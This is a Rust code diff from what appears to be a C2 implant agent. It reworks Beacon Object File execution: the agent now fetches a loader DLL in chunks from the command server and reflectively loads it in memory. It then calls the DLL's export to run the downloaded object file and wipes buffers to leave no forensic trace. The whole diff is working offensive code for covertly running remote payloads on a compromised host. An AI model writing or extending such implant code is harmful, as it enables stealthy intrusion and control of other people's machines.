@@ -2,23 +2,23 @@ use serde::Deserialize;
 use serde_json::{Value, json};
 use base64::engine::general_purpose;
 use base64::Engine;
-use std::io::Write;
+
 const CHUNK_SIZE: usize = 4096;
 
 #[derive(Deserialize)]
 struct UploadParams {
     file_id: String,
     parameters: String,
+    #[serde(default)]
+    loader_file_id: String,
 }
 
 pub fn executeBOF(task: &Value) -> Result<(), Box<dyn std::error::Error>> {
-    // 1. Extract fields
     let id = task.get("id").and_then(Value::as_str).ok_or("Missing `id`")?;
     let raw = task.get("parameters").and_then(Value::as_str).ok_or("Missing `parameters`")?;
     let params: UploadParams = serde_json::from_str(raw)?;
     let file_id = &params.file_id;
 
-    // 2. Download chunks into buffer
     let mut file_bytes = Vec::new();
     let mut chunk_num = 1;
     let mut total_chunks = 1;
@@ -48,38 +48,98 @@ pub fn executeBOF(task: &Value) -> Result<(), Box<dyn std::error::Error>> {
 
     crate::helpers::churn(file_bytes.as_slice());
 
-    let exe = std::env::current_exe()?;
-    let worker_input = json!({
-        "file_bytes": general_purpose::STANDARD.encode(&file_bytes),
-        "parameters": params.parameters
-    })
-    .to_string();
+    if !params.loader_file_id.is_empty() && !crate::loader_cache::is_cached(&crate::loader_cache::LoaderKind::Bof) {
+        let mut loader_bytes = Vec::new();
+        let mut chunk_num = 1;
+        let mut total_chunks = 1;
 
-    let mut child = std::process::Command::new(&exe)
-        .arg("--worker-bof")
-        .stdin(std::process::Stdio::piped())
-        .stdout(std::process::Stdio::piped())
-        .stderr(std::process::Stdio::piped())
-        .spawn()?;
+        while chunk_num <= total_chunks {
+            let payload = json!({
+                "action": "post_response",
+                "responses": [{
+                    "upload": {
+                        "chunk_size": CHUNK_SIZE,
+                        "file_id": params.loader_file_id,
+                        "chunk_num": chunk_num,
+                    },
+                    "task_id": id,
+                    "completed": true
+                }]
+            })
+            .to_string();
+            let resp: Value = crate::transport::send_request_with_response(&payload)?;
+            let entry = &resp["responses"][0];
+            total_chunks = entry["total_chunks"].as_u64().ok_or("Bad loader `total_chunks`")? as usize;
+            let chunk_data = entry["chunk_data"].as_str().ok_or("Missing loader `chunk_data`")?;
+            let bytes = general_purpose::STANDARD.decode(chunk_data)?;
+            loader_bytes.extend_from_slice(&bytes);
+            chunk_num += 1;
+        }
 
-    if let Some(mut stdin) = child.stdin.take() {
-        stdin.write_all(worker_input.as_bytes())?;
+        crate::loader_cache::store(&crate::loader_cache::LoaderKind::Bof, loader_bytes);
     }
 
-    let child_output = child.wait_with_output()?;
+    let loader_dll = match crate::loader_cache::get(&crate::loader_cache::LoaderKind::Bof) {
+        Ok(dll) => dll,
+        Err(e) => {
+            let done = json!({
+                "action": "post_response",
+                "responses": [{"task_id": id, "user_output": format!("BOF loader not available: {}. Run 'loadLoader bof' first.", e), "status": "error", "completed": true}]
+            }).to_string();
+            crate::transport::send_request(&done)?;
+            return Ok(());
+        }
+    };
 
-    let (output, status) = if child_output.status.success() {
-        (String::from_utf8_lossy(&child_output.stdout).to_string(), "success")
-    } else {
-        let stderr = String::from_utf8_lossy(&child_output.stderr);
-        let stdout = String::from_utf8_lossy(&child_output.stdout);
-        let msg = format!(
-            "BOF worker exited with code {:?}{}{}",
-            child_output.status.code(),
-            if !stdout.is_empty() { format!("\nstdout: {}", stdout) } else { String::new() },
-            if !stderr.is_empty() { format!("\nstderr: {}", stderr) } else { String::new() }
+    let args = crate::beacon_pack::pack_args(&params.parameters)
+        .map_err(|e| -> Box<dyn std::error::Error> { e.into() })?;
+
+    crate::helpers::churn(args.as_slice());
+
+    let (output, status) = unsafe {
+        let module = crate::reflective_loader::load(&loader_dll)
+            .map_err(|e| -> Box<dyn std::error::Error> { e.into() })?;
+
+        crate::mem_wipe::wipe(loader_dll.as_ptr() as *mut u8, loader_dll.len());
+
+        let execute_fn = module.get_export("execute_bof")
+            .ok_or("execute_bof export not found")?;
+
+        type ExecuteBofFn = unsafe extern "C" fn(*const u8, usize, *const u8, usize, *mut *mut u8, *mut usize) -> i32;
+        let execute: ExecuteBofFn = core::mem::transmute(execute_fn);
+
+        let mut out_ptr: *mut u8 = std::ptr::null_mut();
+        let mut out_len: usize = 0;
+
+        let (args_ptr, args_len) = if args.is_empty() {
+            (std::ptr::null(), 0)
+        } else {
+            (args.as_ptr(), args.len())
+        };
+
+        let ret = execute(
+            file_bytes.as_ptr(), file_bytes.len(),
+            args_ptr, args_len,
+            &mut out_ptr, &mut out_len,
         );
-        (msg, "error")
+
+        let output = if !out_ptr.is_null() && out_len > 0 {
+            let s = String::from_utf8_lossy(std::slice::from_raw_parts(out_ptr, out_len)).to_string();
+            crate::mem_wipe::wipe(out_ptr, out_len);
+            let _ = Vec::from_raw_parts(out_ptr, out_len, out_len);
+            s
+        } else {
+            String::new()
+        };
+
+        module.unload();
+        crate::mem_wipe::wipe_vec(&mut file_bytes);
+        if !args.is_empty() {
+            crate::mem_wipe::wipe(args.as_ptr() as *mut u8, args.len());
+        }
+
+        let status = if ret == 0 { "success" } else { "error" };
+        (output, status)
     };
 
     crate::helpers::churn(output.as_str());
